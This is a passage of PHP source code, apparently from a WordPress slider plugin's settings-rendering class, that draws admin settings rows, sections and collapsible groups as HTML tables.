			<?php 
		}
		
		//-----------------------------------------------------------------------------------------------
		//draw hr row
		protected function drawHrRow($setting){
			//set hidden
			$rowStyle = "";
			if(isset($setting["hidden"])) $rowStyle = "style='display:none;'";
			
			$class = UniteFunctionsRev::getVal($setting, "class");
			if(!empty($class))
				$class = "class='$class'";
			
			?>
			<tr id="<?php echo $setting["id_row"]?>" <?php echo $rowStyle ?>>
				<td colspan="4" align="left" style="text-align:left;">
					 <hr <?php echo $class; ?> /> 
				</td>
			</tr>
			<?php 
		}
		
		
		
		//-----------------------------------------------------------------------------------------------
		//draw settings row
		protected function drawSettingRow($setting){
		
			//set cellstyle:
			$cellStyle = "";
			if(isset($setting[UniteSettingsRev::PARAM_CELLSTYLE])){
				$cellStyle .= $setting[UniteSettingsRev::PARAM_CELLSTYLE];
			}
			
			//set text style:
			$textStyle = $cellStyle;
			if(isset($setting[UniteSettingsRev::PARAM_TEXTSTYLE])){
				$textStyle .= $setting[UniteSettingsRev::PARAM_TEXTSTYLE];
			}
			
			if($textStyle != "") $textStyle = "style='".$textStyle."'";
			if($cellStyle != "") $cellStyle = "style='".$cellStyle."'";
			
			//set hidden
			$rowStyle = "";
			if(isset($setting["hidden"])) $rowStyle = "display:none;";
			if(!empty($rowStyle)) $rowStyle = "style='$rowStyle'";
			
			//set text class:
			$class = "";
			if(isset($setting["disabled"])) $class = "class='disabled'";
			
			//modify text:
			$text = UniteFunctionsRev::getVal($setting,"text","");				
			// prevent line break (convert spaces to nbsp)
			$text = str_replace(" ","&nbsp;",$text);
			switch($setting["type"]){					
				case UniteSettingsRev::TYPE_CHECKBOX:
					$text = "<label for='".$setting["id"]."' style='cursor:pointer;'>$text</label>";
				break;
			}			
			
			//set settings text width:
			$textWidth = "";
			if(isset($setting["textWidth"])) $textWidth = 'width="'.$setting["textWidth"].'"';
			
			$description = UniteFunctionsRev::getVal($setting, "description");
			$required = UniteFunctionsRev::getVal($setting, "required");
			
			?>
				<tr id="<?php echo $setting["id_row"]?>" <?php echo $rowStyle ?> <?php echo $class?> valign="top">
					<th <?php echo $textStyle?> scope="row" <?php echo $textWidth ?>>
						<?php echo $text?>:
					</th>
					<td <?php echo $cellStyle?>>
						<?php 
							$this->drawInputs($setting);
						?>
						<?php if(!empty($required)):?>
							<span class='setting_required'>*</span>
						<?php endif?>											
						<?php if(!empty($description)):?>
							<span class="description"><?php echo $description?></span>
						<?php endif?>						
					</td>
				</tr>								
			<?php 
		}
		
		//-----------------------------------------------------------------------------------------------
		//draw all settings
		public function drawSettings(){
			$this->drawHeaderIncludes();
			$this->prepareToDraw();
			
			//draw main div
			$lastSectionKey = -1;
			$visibleSectionKey = 0;
			$lastSapKey = -1;
			
			$arrSections = $this->settings->getArrSections();
			$arrSettings = $this->settings->getArrSettings();
			
			//draw settings - simple
			if(empty($arrSections)):
					?><table class='form-table'><?php
					foreach($arrSettings as $key=>$setting){
						switch($setting["type"]){
							case UniteSettingsRev::TYPE_HR:
								$this->drawHrRow($setting);
							break;
							case UniteSettingsRev::TYPE_STATIC_TEXT:
								$this->drawTextRow($setting);
							break;
							default:
								$this->drawSettingRow($setting);
							break;
						}
					}
					?></table><?php					
			else:
			
				//draw settings - advanced - with sections
				foreach($arrSettings as $key=>$setting):
								
					//operate sections:
					if(!empty($arrSections) && isset($setting["section"])){										
						$sectionKey = $setting["section"];
												
						if($sectionKey != $lastSectionKey):	//new section					
							$arrSaps = $arrSections[$sectionKey]["arrSaps"];
							
							if(!empty($arrSaps)){
								//close sap
								if($lastSapKey != -1):
								?>
									</table>
									</div>
								<?php						
								endif;							
								$lastSapKey = -1;
							}
							
					 		$style = ($visibleSectionKey == $sectionKey)?"":"style='display:none'";
					 		
					 		//close section
					 		if($sectionKey != 0):
					 			if(empty($arrSaps))
					 				echo "</table>";
					 			echo "</div>\n";	 
					 		endif;					 		
					 		
							//if no saps - add table
							if(empty($arrSaps)):
							?><table class="form-table"><?php
							endif;								
						endif;
						$lastSectionKey = $sectionKey;
					}//end section manage
					
					//operate saps
					if(!empty($arrSaps) && isset($setting["sap"])){				
						$sapKey = $setting["sap"];
						if($sapKey != $lastSapKey){
							$sap = $this->settings->getSap($sapKey,$sectionKey);
							
							//draw sap end					
							if($sapKey != 0): ?>
							</table>
							<?php endif;
							
							//set opened/closed states:
							//$style = "style='display:none;'";
							$style = "";
							
							$class = "divSapControl";
							
							if($sapKey == 0 || isset($sap["opened"]) && $sap["opened"] == true){
								$style = "";
								$class = "divSapControl opened";						
							}
							
							?>
								<div id="divSapControl_<?php echo $sectionKey."_".$sapKey?>" class="<?php echo $class?>">
									
									<h3><?php echo $sap["text"]?></h3>
								</div>
								<div id="divSap_<?php echo $sectionKey."_".$sapKey?>" class="divSap" <?php echo $style ?>>				
								<table class="form-table">
							<?php 
							$lastSapKey = $sapKey;
						}
					}//saps manage
					
					//draw row:
					switch($setting["type"]){
						case UniteSettingsRev::TYPE_HR:
							$this->drawHrRow($setting);
						break;
						case UniteSettingsRev::TYPE_STATIC_TEXT:
							$this->drawTextRow($setting);
						break;
						default:
							$this->drawSettingRow($setting);
						break;
					}					
				endforeach;
			endif;	
			 ?>
			</table>
			
			<?php
			if(!empty($arrSections)):
				if(empty($arrSaps))	 //close table settings if no saps 
					echo "</table>";
				echo "</div>\n";	 //close last section div
			endif;
			
		}
		
		
		//-----------------------------------------------------------------------------------------------
		// draw sections menu
		public function drawSections($activeSection=0){
			if(!empty($this->arrSections)):
				echo "<ul class='listSections' >";
				for($i=0;$i<count($this->arrSections);$i++):
					$class = "";
					if($activeSection == $i) $class="class='selected'";
					$text = $this->arrSections[$i]["text"];
					echo '<li '.$class.'><a onfocus="this.blur()" href="#'.($i+1).'"><div>'.$text.'</div></a></li>';
				endfor;
				echo "</ul>";
			endif;
				
			//call custom draw function:
			if($this->customFunction_afterSections) call_user_func($this->customFunction_afterSections);
		}
		
		/**
		 * 
		 * draw settings function
		 * @param $drawForm draw the form yes / no
		 */
		public function draw($formID=null,$drawForm = false){
			if(empty($formID))
				UniteFunctionsRev::throwError("The form ID can't be empty. you must provide it");
				
				$this->formID = $formID;
				
			?>
				<div class="settings_wrapper unite_settings_wide">
			<?php
			
			if($drawForm == true){
				?>
				<form name="<?php echo $formID?>" id="<?php echo $formID?>">
					<?php $this->drawSettings() ?>
				</form>
				<?php 				
			}else
				$this->drawSettings();
			
			?>
			</div>
			<?php 
		}

		
	}
?>